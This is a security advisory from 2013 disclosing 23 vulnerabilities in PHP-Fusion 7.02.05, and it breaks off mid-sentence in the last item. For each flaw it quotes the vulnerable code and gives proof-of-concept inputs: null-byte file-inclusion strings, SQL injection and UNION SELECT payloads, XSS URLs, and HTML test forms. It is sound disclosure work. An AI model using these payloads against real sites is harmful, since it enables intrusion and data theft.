@@ -1,0 +1,903 @@
+[waraxe-2013-SA#097] - Multiple Vulnerabilities in PHP-Fusion 7.02.05
+===============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 27. February 2013
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-97.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+PHP-Fusion is a light-weight open-source content management system (CMS)
+written in PHP 5. It utilises a MySQL database to store your site content and
+includes a simple, comprehensive administration system. PHP-Fusion includes the
+most common features you would expect to see in many other CMS packages. 
+
+http://www.php-fusion.co.uk/news.php
+http://sourceforge.net/projects/php-fusion/
+
+Vulnerable is version 7.02.05 and possibly older versions.
+
+New, patched version 7.02.06 available here:
+
+http://www.php-fusion.co.uk/news.php?readmore=569
+http://www.php-fusion.co.uk/downloads.php?cat_id=23&download_id=264
+
+
+###############################################################################
+1. Local File Inclusion in "maincore.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameter "user_theme"
+Preconditions:
+ 1. Logged in as valid user
+ 2. "Allow users to change theme" option must be activated (it is by default)
+ 3. PHP must be < 5.3.4 for null-byte attacks to work
+ 
+PHP-Fusion users can edit their profile and by default there is possibility to
+change the theme. There is no sufficient sanitization of the POST parameter
+"user_theme":
+
+Php script "includes/user_fields/user_theme_include" line 41:
+------------------------[ source code start ]----------------------------------
+} elseif ($profile_method == "validate_insert"  || $profile_method == "validate_update") {
+    if ($settings['userthemes'] == 1 || iADMIN) {
+        // Get input data
+        if (isset($_POST['user_theme']) && $_POST['user_theme'] != "") {
+            // Set update or insert user data
+            $this->_setDBValue("user_theme", stripinput(trim($_POST['user_theme'])));
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied parameter "user_theme" goes through the
+function "stripinput()":
+
+Php script "maincore.php" line 332:
+------------------------[ source code start ]----------------------------------
+// Strip Input Function, prevents HTML in unwanted places
+function stripinput($text) {
+    if (!is_array($text)) {
+        $text = stripslash(trim($text));
+        $text = preg_replace("/(&)+(?=\#([0-9]{2,3});)/i", "&", $text);
+        $search = array("&", "\"", "'", "\\", '\"', "\'", "<", ">", "&nbsp;");
+        $replace = array("&", """, "'", "\", """, "'", "<", ">", " ");
+        $text = str_replace($search, $replace, $text);
+    } else {
+        foreach ($text as $key => $value) {
+            $text[$key] = stripinput($value);
+        }
+    }
+    return $text;
+}
+------------------------[ source code end ]------------------------------------
+
+This function works against XSS and SQL Injection attacks, but not against
+file inclusion attacks. Attacker can submit user theme value as one below:
+
+../images/avatars/waraxe.jpg\0z
+
+Directory traversal symbols "../" and null byte will pass through the
+function "stripinput()" and whole string will be saved to the database.
+All subsequent requests by attacker will use this malicious theme string
+and as result, previously uploaded avatar picture with PHP payload gets
+included and executed.
+
+Most front-end scripts start with this:
+------------------------[ source code start ]----------------------------------
+require_once "maincore.php";
+require_once THEMES."templates/header.php";
+------------------------[ source code end ]------------------------------------
+
+Php script "maincore.php" line 264:
+------------------------[ source code start ]----------------------------------
+// Set theme
+if (!theme_exists($userdata['user_theme'])) {
+...
+// Check that site or user theme exists
+function theme_exists($theme) {
+    global $settings;
+...
+    } elseif (file_exists(THEMES.$theme."/theme.php") && file_exists(THEMES.$theme."/styles.css")) {
+        define("THEME", THEMES.$theme."/");
+------------------------[ source code end ]------------------------------------
+
+We can see, that malicious theme string from database will be used in theme path
+definition and later is used in "require_once".
+
+This security vulnerability was tested by using Burp Proxy and exploitation
+succeeded.
+
+###############################################################################
+2. Local File Inclusion in "administration/user_fields.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "enable"
+Preconditions:
+ 1. Logged in as admin with user field administration privileges
+ 2. PHP must be < 5.3.4 for null-byte attacks to work
+ 
+ 
+Php script "administration/user_fields.php" line 84:
+------------------------[ source code start ]----------------------------------
+} elseif (isset($_GET['enable'])
+        && file_exists(INCLUDES."user_fields/".stripinput($_GET['enable'])."_include_var.php")
+        && file_exists(INCLUDES."user_fields/".stripinput($_GET['enable'])."_include.php")
+) {
+    $user_field_api_version = "1.00.00";
+    if (file_exists(LOCALE.LOCALESET."user_fields/".stripinput($_GET['enable']).".php")) {
+        include LOCALE.LOCALESET."user_fields/".stripinput($_GET['enable']).".php";
+------------------------[ source code end ]------------------------------------
+
+Test (parameter "aid" needs to be valid):
+
+Upload avatar picture with PHP payload and then issue request:
+
+http://localhost/phpfusion70205/administration/user_fields.php?
+aid=e017e24eb00e8ccf&enable=../../images/avatars/waraxe.jpg%00z
+
+
+###############################################################################
+3. SQL Injection in "includes/classes/Authenticate.class.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied HTTP cookie
+Preconditions:
+ 1. magic_quotes_gpc=off 
+ 
+ 
+Php script "includes/classes/Authenticate.class.php" line 143:
+------------------------[ source code start ]----------------------------------
+// Validate authenticated user
+ public static function validateAuthUser($userCookie = true) {
+
+  if (isset($_COOKIE[COOKIE_USER]) && $_COOKIE[COOKIE_USER] != "") {
+   $cookieDataArr = explode(".", $_COOKIE[COOKIE_USER]);
+
+   if (count($cookieDataArr) == 3) {
+    list($userID, $cookieExpiration, $cookieHash) = $cookieDataArr;
+
+    if ($cookieExpiration > time()) {
+     $result = dbquery(
+      "SELECT * FROM ".DB_USERS."
+      WHERE user_id='".$userID."' AND user_status='0' AND user_actiontime='0'
+      LIMIT 1"
+     );
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied cookie will be exploded to three parts and
+first part, "userID" is used in SQL query without any sanitization, which
+leads to SQL Injection vulnerability.
+
+
+###############################################################################
+4. SQL Injection in "downloads.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "orderby"
+Preconditions:
+ 1. valid download category with at least one download
+ 
+Php script "downloads.php" line 111:
+------------------------[ source code start ]----------------------------------
+if (isset($_GET['orderby'])) {
+    $order_by = stripinput($_GET['orderby']);
+...
+$result = dbquery(
+ "SELECT td.download_id, td.download_user, td.download_datestamp,
+...
+ ORDER BY ".($order_by == "" ? $cat_data['download_cat_sorting'] : $order_by." ".$sort)."
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://localhost/phpfusion70205/downloads.php?cat_id=1&orderby=waraxe
+
+"Unknown column 'waraxe' in 'order clause'"
+
+http://localhost/phpfusion70205/downloads.php?cat_id=1&orderby=IF(0,1,(SELECT+1+UNION+SELECT+2))
+
+Result: error message "Subquery returns more than 1 row"
+
+http://localhost/phpfusion70205/downloads.php?cat_id=1&orderby=IF(1,1,(SELECT+1+UNION+SELECT+2))
+
+Result: normal page
+
+
+###############################################################################
+5. SQL Injection in "forum/postedit.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameter "delete_attach_*"
+Preconditions:
+ 1. Logged in as user with forum posting privileges
+ 2. magic_quotes_gpc=off
+ 
+ 
+Php script "forum/postedit.php" line 219:
+------------------------[ source code start ]----------------------------------
+foreach ($_POST as $key=>$value){
+ if(!strstr($key, "delete_attach")) continue;
+ $key = str_replace("delete_attach_", "", $key);
+ $result = dbquery("SELECT * FROM ".DB_FORUM_ATTACHMENTS." WHERE post_id='".$_GET['post_id']."' and attach_id='$key'");
+------------------------[ source code end ]------------------------------------
+
+Test (parameters "forum_id", "thread_id" and "post_id" must be valid):
+
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/phpfusion70205/forum/post.php?action=edit&forum_id=2&thread_id=1&post_id=1" method="post">
+<input type="hidden" name="savechanges" value="1">
+<input type="hidden" name="message" value="Testing">
+<input type="hidden" name="delete_attach_war'axe" value="1">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result (302 redirect makes it difficult to see SQL error, Burp Proxy will help):
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe'' at line 1
+
+
+###############################################################################
+6. SQL Injection in "forum/postnewthread.php"
+###############################################################################
+
+Reason: uninitialized variable "$poll_opts"
+Attack vector: user-supplied parameter "poll_opts"
+Preconditions:
+1. logged in as user with poll creation privileges
+2. available forum with poll creation abilities
+3. magic_quotes_gpc=off
+4. register_globals=on
+ 
+ 
+Php script "forum/postnewthread.php" line 126:
+------------------------[ source code start ]----------------------------------
+foreach ($poll_opts as $poll_option) {
+    $result = dbquery("INSERT INTO ".DB_FORUM_POLL_OPTIONS." (thread_id,
+    forum_poll_option_id, forum_poll_option_text, forum_poll_option_votes)
+    VALUES('".$thread_id."', '".$i."', '".$poll_option."', '0')");
+    $i++;
+}
+------------------------[ source code end ]------------------------------------
+
+Test (parameter "forum_id" must be valid):
+
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/phpfusion70205/forum/post.php?action=newthread&forum_id=2" method="post">
+<input type="hidden" name="subject" value="Test subject">
+<input type="hidden" name="message" value="Test message">
+<input type="hidden" name="poll_title" value="Test poll">
+<input type="hidden" name="poll_opts[]" value="war'axe">
+<input type="hidden" name="postnewthread" value="1">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result (302 redirect makes it difficult to see SQL error, Burp Proxy will help):
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe', '0')' at line 1
+
+
+
+###############################################################################
+7. SQL Injection in "administration/settings_messages.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameters "pm_email_notify", "pm_save_sent",
+ "pm_inbox", "pm_sentbox", "pm_savebox"
+Preconditions:
+ 1. logged in as admin with private message settings change privileges
+ 2. magic_quotes_gpc=off
+ 
+ 
+Php script "administration/settings_messages.php" line 38:
+------------------------[ source code start ]----------------------------------
+if (isset($_POST['saveoptions'])) {
+    $error = 0;
+    dbquery("UPDATE ".DB_MESSAGES_OPTIONS." SET
+        pm_email_notify = '".$_POST['pm_email_notify']."',
+        pm_save_sent = '".$_POST['pm_save_sent']."',
+        pm_inbox = '".$_POST['pm_inbox']."',
+        pm_sentbox = '".$_POST['pm_sentbox']."',
+        pm_savebox = '".$_POST['pm_savebox']."'
+        WHERE user_id='0'"
+    );
+------------------------[ source code end ]------------------------------------
+
+
+###############################################################################
+8. SQL Injection in "administration/settings_photo.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameters "thumb_compression",
+"photo_watermark_text_color1", "photo_watermark_text_color2", "photo_watermark_text_color3"
+Preconditions:
+ 1. logged in as admin with photo gallery settings change privileges
+ 2. magic_quotes_gpc=off
+ 
+ 
+Php script "administration/settings_photo.php" line 100:
+------------------------[ source code start ]----------------------------------
+$result = dbquery("UPDATE ".DB_SETTINGS." SET settings_value='".$_POST['thumb_compression']."'
+WHERE settings_name='thumb_compression'");
+...
+$result = dbquery("UPDATE ".DB_SETTINGS." SET settings_value=
+'".(preg_match("/([0-9A-F]){6}/i",$_POST['photo_watermark_text_color1']) ?
+ $_POST['photo_watermark_text_color1'] : "FF6600")."' WHERE settings_name='photo_watermark_text_color1'");
+if (!$result) { $error = 1; }
+$result = dbquery("UPDATE ".DB_SETTINGS." SET settings_value=
+'".(preg_match("/([0-9A-F]){6}/i",$_POST['photo_watermark_text_color2']) ?
+ $_POST['photo_watermark_text_color2'] : "FFFF00")."' WHERE settings_name='photo_watermark_text_color2'");
+if (!$result) { $error = 1; }
+$result = dbquery("UPDATE ".DB_SETTINGS." SET settings_value='
+".(preg_match("/([0-9A-F]){6}/i",$_POST['photo_watermark_text_color3']) ?
+ $_POST['photo_watermark_text_color3'] : "FFFFFF")."' WHERE settings_name='photo_watermark_text_color3'");
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied POST parameter "thumb_compression" is used in
+SQL query without any sanitization. Other three affected parameters
+"photo_watermark_text_color1", photo_watermark_text_color2", "photo_watermark_text_color1"
+are checked against regex, but this regex is flawed and does not stop SQL injection.
+Attacker can use "AABBCC'waraxe" and regex check is bypassed.
+Correct regex would be "/^([0-9A-F]){6}$/i".
+
+
+###############################################################################
+9. SQL Injection in "administration/bbcodes.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "enable"
+Preconditions:
+ 1. logged in as admin with BB Codes administration privileges
+ 2. magic_quotes_gpc=off
+ 3. PHP must be < 5.3.4 for null-byte attacks to work
+ 
+ 
+Php script "administration/bbcodes.php" line 49:
+------------------------[ source code start ]----------------------------------
+} elseif (isset($_GET['enable']) &&
+ file_exists(INCLUDES."bbcodes/".$_GET['enable']."_bbcode_include_var.php") &&
+ file_exists(INCLUDES."bbcodes/".$_GET['enable']."_bbcode_include.php")) {
+...
+ $result = dbquery("INSERT INTO ".DB_BBCODES." (bbcode_name, bbcode_order)
+  VALUES ('".$_GET['enable']."', '".$order."')");
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-supplied GET parameter "enable" is used in SQL query
+without sufficient sanitization. There are two checks against valid filenames,
+but it's possible to use null byte method to bypass these checks.
+
+Test (parameter "aid" needs to be valid):
+
+http://localhost/phpfusion70205/administration/bbcodes.php?aid=c37dd1f4ea5686c5&enable=%00war'axe
+
+Result (302 redirect makes it difficult to see SQL error, Burp Proxy will help):
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe', '13')' at line 1
+
+
+###############################################################################
+10. SQL Injection in "administration/news.php" case 1
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameters "news_image", "news_image_t1"
+ and "news_image_t1"
+Preconditions:
+ 1. logged in as admin with news administration privileges
+ 2. magic_quotes_gpc=off
+ 
+ 
+Php script "administration/news.php" line 106:
+------------------------[ source code start ]----------------------------------
+$news_image = (isset($_POST['news_image']) ? $_POST['news_image'] : "");
+$news_image_t1 = (isset($_POST['news_image_t1']) ? $_POST['news_image_t1'] : "");
+$news_image_t2 = (isset($_POST['news_image_t2']) ? $_POST['news_image_t2'] : "");
+...
+$result = dbquery("UPDATE ".DB_NEWS." SET news_subject='$news_subject', 
+ news_cat='$news_cat', news_end='$news_end_date', news_image='$news_image',
+ news_news='$body', news_extended='$body2', news_breaks='$news_breaks',
+ ".($news_start_date != 0 ? " news_datestamp='$news_start_date'," : "").
+ " news_start='$news_start_date', news_image_t1='$news_image_t1', news_image_t2=
+ '$news_image_t2', news_visibility='$news_visibility', news_draft='$news_draft',
+ news_sticky='$news_sticky', news_allow_comments='$news_comments', 
+ news_allow_ratings='$news_ratings' WHERE news_id='".$_POST['news_id']."'");
+------------------------[ source code end ]------------------------------------
+
+Test (parameter "aid" needs to be valid):
+
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/phpfusion70205/administration/news.php?aid=0ebd6f54040890e8" method="post">
+<input type="hidden" name="save" value="1">
+<input type="hidden" name="news_image" value="war'axe">
+<input type="hidden" name="news_image_t1" value="war'axe2">
+<input type="hidden" name="news_image_t2" value="war'axe3">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result (302 redirect makes it difficult to see SQL error, Burp Proxy will help):
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use
+near 'axe', 'war'axe2', 'war'axe3', '0', '0', '0', '0', '0', '0')' at line 1
+
+
+###############################################################################
+11. SQL Injection in "administration/articles.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameter "article_id"
+Preconditions:
+ 1. Logged in as admin with articles administration privileges
+ 2. magic_quotes_gpc=off
+ 
+ 
+Php script "administration/articles.php" line :
+------------------------[ source code start ]----------------------------------
+if ((isset($_GET['action']) && $_GET['action'] == "edit") && 
+   (isset($_POST['article_id']) && isnum($_POST['article_id'])) || 
+     (isset($_GET['article_id']) && isnum($_GET['article_id']))) {
+  $result = dbquery("SELECT article_cat, article_subject, article_snippet,
+   article_article, article_draft, article_breaks, article_allow_comments, 
+   article_allow_ratings FROM ".DB_ARTICLES." WHERE 
+   article_id='".(isset($_POST['article_id']) ? $_POST['article_id'] : $_GET['article_id'])."'")
+------------------------[ source code end ]------------------------------------
+
+As seen above, user-supplied parameter "article_id" goes through validation
+before using in SQL query, but this validation has flawed logic. If we submit
+numeric GET parameter "article_id" and non-numeric malicious POST parameter
+with the same name, then first check will pass, because GET parameter
+is valid, but after that POST parameter is used in SQL query ...
+
+Test (parameter "aid" must be valid):
+
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/phpfusion70205/administration/articles.php?aid=0ebd6f54040890e8&action=edit&article_id=123" method="post">
+<input type="hidden" name="article_id" value="0'UNION SELECT 1,@@version,3,4,5,6,7,'8">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+###############################################################################
+12. SQL Injection in "administration/news.php" case 2
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameter "news_id"
+Preconditions:
+ 1. logged in as admin with news administration privileges
+ 2. magic_quotes_gpc=off
+ 
+This security vulnerability is similar to the previous case. User-supplied
+data verification exists, but it's not able to stop SQL injection due to flawed
+logic.
+ 
+Php script "administration/news.php" line 236:
+------------------------[ source code start ]----------------------------------
+if ((isset($_GET['action']) && $_GET['action'] == "edit") &&
+  (isset($_POST['news_id']) && isnum($_POST['news_id'])) || 
+  (isset($_GET['news_id']) && isnum($_GET['news_id']))) {
+ $result = dbquery("SELECT news_subject, news_cat, news_news, news_extended, 
+ news_start, news_end, news_image, news_image_t1, news_image_t2, news_visibility,
+ news_draft, news_sticky, news_breaks, news_allow_comments, news_allow_ratings
+ FROM ".DB_NEWS." WHERE news_id='".(isset($_POST['news_id']) ? $_POST['news_id']
+ : $_GET['news_id'])."' LIMIT 1");
+------------------------[ source code end ]------------------------------------
+
+Test (parameter "aid" needs to be valid):
+
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/phpfusion70205/administration/news.php?aid=0ebd6f54040890e8&action=edit&news_id=123" method="post">
+<input type="hidden" name="news_id" value="0'UNION SELECT 1,2,@@version,4,5,6,7,8,9,10,11,12,13,14,'15">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+###############################################################################
+13. Reflected XSS in "forum/viewthread.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied GET parameter "highlight"
+Preconditions:
+ 1. there must exist at least one forum thread
+ 
+
+Php script "forum/viewthread.php" line 361:
+------------------------[ source code start ]----------------------------------
+    // highlight jQuery plugin
+    if (isset($_GET['highlight'])) {
+        $words = explode(" ", urldecode($_GET['highlight']));
+        $higlight = ""; $i = 1; $c_words = count($words);
+        foreach ($words as $hlight) {
+            $higlight .= "'".$hlight."'";
+            $higlight .= ($i < $c_words ? "," : "");
+            $i++;
+        }
+        add_to_head("<script type='text/javascript' src='".INCLUDES."jquery/jquery.highlight.js'></script>");
+        $highlight_js .=   "jQuery('.search_result').highlight([".$higlight."],{wordsOnly:true});";
+------------------------[ source code end ]------------------------------------
+
+Test (parameter "thread_id" must be valid):
+
+http://localhost/phpfusion70205/forum/viewthread.php?thread_id=20&highlight=%2527]);});alert(123);/*
+
+
+###############################################################################
+14. Reflected XSS in "messages.php"
+###############################################################################
+
+Reason:
+ 1. uninitialized variables "$user_list" and "$user_types"
+ 2. insufficient sanitization of html output
+Attack vector: user-supplied parameters "user_list", "user_types"
+Preconditions:
+ 1. logged in as user
+ 2. register_globals=on
+ 
+ 
+Php script "messages.php" line 482:
+------------------------[ source code start ]----------------------------------
+if ($_GET['msg_send'] == "0") {
+    echo "<select name='msg_send' class='textbox'>\n".$user_list."</select>\n";
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/phpfusion70205/messages.php?msg_send=0" method="post">
+<input type="hidden" name="chk_sendtoall" value="0">
+<input type="hidden" name="user_list" value="</select><script>alert(123);</script>">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Similar problem is related to variable "$user_types", only in this case admin
+access level is needed:
+
+Php script "messages.php" line 490:
+------------------------[ source code start ]----------------------------------
+if (iADMIN && !isset($_GET['msg_id'])) {
+    echo "<label><input name='chk_sendtoall' type='checkbox' ".$sendtoall_chk." />\n";
+    echo "".$locale['434'].":</label> <select name='msg_to_group' class='textbox'>\n".$user_types."</select>\n";
+------------------------[ source code end ]------------------------------------
+
+
+###############################################################################
+15. Reflected XSS in "infusions/shoutbox_panel/shoutbox_admin.php"
+###############################################################################
+Reason:
+ 1. uninitialized variable "$message"
+ 2. insufficient sanitization of html output
+Attack vector: user-supplied parameter "message"
+Preconditions:
+ 1. logged in as admin with shoutbox administration privileges
+ 2. register_globals=on
+ 
+Php script "infusions/shoutbox_panel/shoutbox_admin.php" line 149:
+------------------------[ source code start ]----------------------------------
+if (isset($message) && $message != "") {
+ echo "<div id='close-message'><div class='admin-message'>".$message."</div></div>\n"; }
+------------------------[ source code end ]------------------------------------
+
+Test (parameter "aid" needs to be valid):
+
+http://localhost/phpfusion70205/infusions/shoutbox_panel/shoutbox_admin.php?
+aid=e017e24eb00e8ccf&page=settings&message=<body+onload=alert(123);+
+
+
+###############################################################################
+16. Reflected XSS in "administration/news.php"
+###############################################################################
+Reason:
+ 1. uninitialized variable "$message"
+ 2. insufficient sanitization of html output
+Attack vector: user-supplied parameter "message"
+Preconditions:
+ 1. logged in as admin with news administration privileges
+ 2. register_globals=on
+ 
+Php script "administration/news.php" line 31:
+------------------------[ source code start ]----------------------------------
+if (isset($_GET['error']) && isnum($_GET['error'])) {
+    if ($_GET['error'] == 1) {
+        $message = $locale['413'];
+...
+    if ($message) {    echo "<div id='close-message'>
+      <div class='admin-message'>".$message."</div></div>\n"; }
+}
+if (isset($_GET['status'])) {
+    if ($_GET['status'] == "sn") {
+        $message = $locale['410'];
+...
+    if ($message) {    echo "<div id='close-message'>
+      <div class='admin-message'>".$message."</div></div>\n"; }
+}
+------------------------[ source code end ]------------------------------------
+
+Tests (parameter "aid" needs to be valid):
+
+http://localhost/phpfusion70205/administration/news.php?aid=0ebd6f54040890e8
+&error=9&message=<body+onload=alert(123);+
+
+http://localhost/phpfusion70205/administration/news.php?aid=0ebd6f54040890e8
+&status=1&message=<body+onload=alert(123);+
+
+
+###############################################################################
+17. Reflected XSS in "administration/panel_editor.php"
+###############################################################################
+
+Reason:
+ 1. uninitialized variable "$panel_list"
+ 2. insufficient sanitization of html output
+Attack vector: user-supplied parameter "panel_list"
+Preconditions:
+ 1. logged in as admin with panel editing privileges
+ 2. register_globals=on
+ 
+ 
+Php script "administration/panel_editor.php" line 32:
+------------------------[ source code start ]----------------------------------
+while ($folder = readdir($temp)) {
+    if (!in_array($folder, array(".","..")) && strstr($folder, "_panel")) {
+        if (is_dir(INFUSIONS.$folder)) $panel_list[] = $folder;
+    }
+}
+...
+for ($i=0;$i < count($panel_list);$i++) {
+        echo "<option".($panel_filename == $panel_list[$i] ? 
+            " selected='selected'" : "").">".$panel_list[$i]."</option>\n";
+
+------------------------[ source code end ]------------------------------------
+
+Test (parameter "aid" needs to be valid):
+
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/phpfusion70205/administration/panel_editor.php?aid=e017e24eb00e8ccf" method="post">
+<input type="hidden" name="panel_list[]" value="<script>alert(123);</script>">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+###############################################################################
+18. Reflected XSS in "administration/phpinfo.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: User-Agent string 
+Preconditions: 
+ 1. logged in as admin with php info view privileges
+ 
+Php script "administration/phpinfo.php" line 46:
+------------------------[ source code start ]----------------------------------
+$phpinfo .= "<tr>\n<td class='tbl2' style='width:20%'>".$locale['410']."</td>
+<td class='tbl1' style='text-align:right'>".$_SERVER['HTTP_USER_AGENT']."</td></tr>\n";
+------------------------[ source code end ]------------------------------------
+
+
+###############################################################################
+19. Reflected XSS in "administration/bbcodes.php"
+###############################################################################
+
+Reason:
+ 1. uninitialized variable "$__BBCODE__"
+ 2. insufficient sanitization of html output
+Attack vector: user-supplied parameter "__BBCODE__"
+Preconditions:
+ 1. logged in as admin with bbcode settings change privileges
+ 2. register_globals=on
+ 
+ 
+Php script "administration/bbcodes.php" line 141:
+------------------------[ source code start ]----------------------------------
+echo "<td class='$cls'>".$__BBCODE__[0]['description']."</td>\n";
+echo "<td class='$cls'>".$__BBCODE__[0]['usage']."</td>\n";
+------------------------[ source code end ]------------------------------------
+
+Test (parameter "aid" needs to be valid):
+
+http://localhost/phpfusion70205/administration/bbcodes.php?aid=693ec1754cc0b042
+&__BBCODE__[0][description]=<body+onload=alert(123);+
+
+http://localhost/phpfusion70205/administration/bbcodes.php?aid=693ec1754cc0b042
+&__BBCODE__[0][usage]=<body+onload=alert(123);+
+
+###############################################################################
+20. Reflected XSS in multiple admin scripts, affected parameter "errorMessage"
+###############################################################################
+
+Reason:
+ 1. uninitialized variables "$error" and "$errorMessage"
+ 2. insufficient sanitization of html output
+Attack vector: user-supplied parameters "error" and "errorMessage"
+Preconditions:
+ 1. logged in as admin with appropriate privileges
+ 2. register_globals=on
+ 
+ 
+Php script "administration/article_cats.php" line 110:
+------------------------[ source code start ]----------------------------------
+    if (isset($error) && isnum($error)) {
+        if ($error == 1) {
+            $errorMessage = $locale['460'];
+        } elseif ($error == 2) {
+            $errorMessage = $locale['461'];
+        }
+        if ($errorMessage) { echo "<div id='close-message'>
+          <div class='admin-message'>".$errorMessage."</div></div>\n"; }
+------------------------[ source code end ]------------------------------------
+
+The same vulnerability exists in four different admin scripts:
+
+1. administration/article_cats.php
+2. administration/download_cats.php
+3. administration/news_cats.php
+4. administration/weblink_cats.php
+
+Tests (parameter "aid" needs to be valid):
+
+http://localhost/phpfusion70205/administration/article_cats.php?
+aid=6242719852b67e0e&error=3&errorMessage=<body+onload=alert(123);+
+
+http://localhost/phpfusion70205/administration/download_cats.php?
+aid=6242719852b67e0e&error=3&errorMessage=<body+onload=alert(123);+
+
+http://localhost/phpfusion70205/administration/news_cats.php?
+aid=6242719852b67e0e&error=3&errorMessage=<body+onload=alert(123);+
+
+http://localhost/phpfusion70205/administration/weblink_cats.php?
+aid=6242719852b67e0e&error=3&errorMessage=<body+onload=alert(123);+
+
+
+###############################################################################
+21. Reflected XSS in "administration/articles.php"
+###############################################################################
+
+Reason: insufficient sanitization of html output
+Attack vector: user-supplied POST parameters "body" and "body2"
+Preconditions:
+ 1. logged in as admin with articles administration privileges
+
+  
+Php script "administration/articles.php" line 70:
+------------------------[ source code start ]----------------------------------
+$bodypreview = str_replace("src='".str_replace("../", "", IMAGES_A), 
+ "src='".IMAGES_A, stripslash($_POST['body']));
+$body2preview = str_replace("src='".str_replace("../", "", IMAGES_A), 
+ "src='".IMAGES_A, stripslash($_POST['body2']));
+...
+echo $bodypreview."\n";
+...
+echo $body2preview."\n";
+------------------------[ source code end ]------------------------------------
+
+Test (parameter "aid" needs to be valid):
+
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/phpfusion70205/administration/articles.php?aid=0ebd6f54040890e8" method="post">
+<input type="hidden" name="preview" value="1">
+<input type="hidden" name="body" value="<script>alert(123);</script>">
+<input type="hidden" name="body2" value="<script>alert(321);</script>">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+###############################################################################
+22. Arbitrary file deletion in "administration/db_backup.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied  POST parameter "file"
+Preconditions:
+ 1. logged in as admin with database backup privileges
+
+ 
+Php script "administration/db_backup.php" line 130:
+------------------------[ source code start ]----------------------------------
+if (isset($_POST['btn_cancel'])) {
+    @unlink(ADMIN."db_backups/".$_POST['file']);
+    redirect(FUSION_SELF.$aidlink);
+}
+------------------------[ source code end ]------------------------------------
+
+As we can see, user-supplied  POST parameter "file" is used in php function
+"unlink()" without any sanitization. It's possible to use directory traversal
+strings "../" and delete arbitrary files on the target system.
+
+
+###############################################################################
+23. Insecure database backup file handling in "administration/db_backup.php"
+###############################################################################
+
+PHP-Fusion admin with Database Backup privileges can use "Database Restore"
+feature. First step is database backup file upload:
+  
+Php script "administration/db_backup.php" line 186:
+------------------------[ source code start ]----------------------------------
+} elseif (isset($_GET['action']) && $_GET['action'] == "restore") {
+ if (is_uploaded_file($_FILES['upload_backup_file']['tmp_name'])) {
+   $temp_rand = rand(1000000, 9999999);
+   $temp_hash = substr(md5($temp_rand), 8, 8);
+   $file = "temp_".$temp_rand.".txt";
+   $backup_name = $_FILES['upload_backup_file']['name'];
+   move_uploaded_file($_FILES['upload_backup_file']['tmp_name'], ADMIN."db_backups/".$file);
+------------------------[ source code end ]------------------------------------
+
+As we can see, uploaded file will be moved to "db_backups" directory.
+Two problems exist with that:
+
+1. There is no access restrictions to this directory. Anyone can access uploaded
+database backup files directly, given that filename is known:
+
+http://localhost/phpfusion70205/administration/db_backups/temp_4973205.txt
+
+2. Database backup's filename is suppose to be random, but there is only about
+9 million possible filenames. Such weak filename randomness makes it possible
+to try bruteforce guessing.
+
+Uploaded files are usually deleted within short timeframe, but may be left
+intact for indefinite time period, if admin does not complete operation and
+does not access database backup script again. In this case filename bruteforce
